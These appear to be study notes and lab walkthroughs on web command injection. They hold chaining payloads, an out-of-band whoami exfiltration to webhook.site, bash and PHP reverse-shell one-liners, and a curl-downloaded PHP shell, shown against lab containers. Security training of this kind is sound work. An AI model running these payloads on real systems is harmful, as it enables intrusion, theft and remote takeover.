# Command Injection

Application taking input from the user. Then passing the input to the function which executes as the code

Injection Type: 

1. Basic
2. Blind
3. Out of Band

<aside>
🚨

eval() is Evil. 
eval() is an executed function that process any data that pass to it.

</aside>

# Exploitation Syntax

Basic command chaining

`; ls -la`

Using logic operators

`&& ls -la`

Commenting out the rest of a command

`; ls -la #`

Using a pipe for command chaining

`| ls -la`

Testing for blind injection

`; sleep 10
; ping -c 10 127.0.0.1
& whoami > /var/www/html/whoami.txt &`

Out-of-band testing

`& nslookup webhook.site/<id>?`whoami` &`

# **Checklist**

- [ ]  Determine the technology stack: Which operating system and server software are in use?
- [ ]  Identify potential injection points: URL parameters, form fields, HTTP headers, etc.
- [ ]  Test for simple injections with special characters like ;, &&, ||, and |. Test for injection within command arguments.
- [ ]  Test for blind command injection, where output is not returned in the response. If output isn't directly visible, try creating outbound requests (e.g. using ping or curl).
- [ ]  Try to escape from any restriction mechanisms, like quotes or double quotes.
- [ ]  Test with a list of potentially dangerous functions/methods (like exec(), system(), passthru() in PHP, or exec, eval in Node.js).
- [ ]  Test for command injection using time delays (ping -c localhost).
- [ ]  Test for command injection using &&, ||, and ;.
- [ ]  Test with common command injection payloads, such as those from PayloadsAllTheThings.
- [ ]  If there's a filter in place, try to bypass it using various techniques like encoding, command splitting, etc.

# Example-1 Command Injection

## Escaping Function

1. Command: curl -I -s -L <Input> | grep "HTTP/"
Input = https://google.com, we get: 

![image.png](image.png)

1. Try use Basic command chaining;
Input = https://google.com`; whoami`, we get: 

![image.png](image%201.png)

1. To escape from the | grep "HTTP/”, use echo;
input = `; whoami; echo 'null/'`, we get:

![image.png](image%202.png)

## Inject other Commands

1. Run other command; 
Input = `; cat /etc/passwd; echo 'a'`, we get:
NOTE: Use Ctrl+U (develop tool) for better view.
    
    ![image.png](image%203.png)
    

## Reverse shell connection

### Bash Shell

1. Learn the path of bash it use; 
Input = `; which bash; echo 'a'`, we get: Result: /bin/bash 
2. Use one line reverse bash_TCP shell
Input = `; /bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1; echo 'a’`  

<aside>
💡

When using command injection, try to use full path to binary. Plus common port.

</aside>

### PhP Shell

1. Learn the path of php it use; 
Input = `; which php; echo 'a'`, we get: Result:  /usr/local/bin/php 
2. Netcat listen on designated port
Listening on 0.0.0.0 4444 …
3. Use one line reverse PhP shell
Input = `; /usr/local/bin/php -r '$sock=fsockopen("<LHOST>",<LPORT>); exec("/bin/sh -i <&3 >&3 2>&3");'; echo 'a’` 
4. Receive the connection.
    
    Connection received on 172.18.0.4 36776
    /bin/sh: 0: can't access tty; job control turned off
    $ whoami
    www-data
    $ tail /etc/passwd
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
    

# Example-2 Out of Bank Command Injection

In this case, the web application doesn’t give us the response directly, we need to direct and review it somewhere else.

1. Reuse the same syntax from previous example; we received Website OK, but the semi-colon is removed.

![image.png](image%204.png)

1. Utilize the [webhook](https://webhook.site/) to receive the HTTP request. Use different syntax to test it
Input = `https://webhook.site/8a2dda28-4ada-4424-889e-a911bd5e8489?`whoami``
2. Navigate to the url, find the command is executed and send to the target site.
    
    ![image.png](image%205.png)
    

### Reverse Shell Connection

1. Using `\n` and `wget` to download file from our server.
Input = https://google.com \n wget <HOST_IP>:<PORT>/<File>
    
    ![Command is executed, but it can’t download the file](image%206.png)
    
    Command is executed, but it can’t download the file
    
2. Use php reverse shell to make the connection
Input = https://google.com \n wget <HOST_IP>:<PORT>/<File>
3. Same result as last step; command is executed, but shell isn’t estblished.
    
    Serving HTTP on 0.0.0.0 port 8080 ([http://0.0.0.0:8080/](http://0.0.0.0:8080/)) ...
    172.18.0.4 - - [27/Jul/2025 17:38:50] "HEAD /link.php HTTP/1.1" 200 -
    172.18.0.4 - - [27/Jul/2025 17:39:57] "HEAD /link.php HTTP/1.1" 200 -
    
4. Use `&&` and `curl` this time to download the file.
Input = https://google.com && curl 192.168.182.163:8080/link.php > /var/www/html/link.php
5. Search http://link.php from out browser, and we will trigger the web server to execute our php shell.
    
    $ whoami
    www-data
    

# Challenge-1

Here’s the syntax of the Web application

- awk 'BEGIN {print sqrt(((-`User_input_1`)^2) + ((-`User_input_2`)^2))}’
1. Escape the bracket, run command, and comment out the rest
Input = )))}' ; whoami #
Result: www-data 
2. Because the page is run off the php file, let out full path of its php
Input = )))}' ; which php #
Result: /usr/local/bin/php 
3. Use netcat listen on port 4444. Run the one line php shell for connection
Input = )))}' ; /usr/local/bin/php -r '$sock=fsockopen("192.168.182.163",4444); exec("/bin/sh -i <&3 >&3 2>&3");' #
Result: 
    
    Listening on 0.0.0.0 4444
    Connection received on 172.18.0.4 56914
    /bin/sh: 0: can't access tty; job control turned off
    $ whoami
    www-data
    $ hostname
    3d0a80465781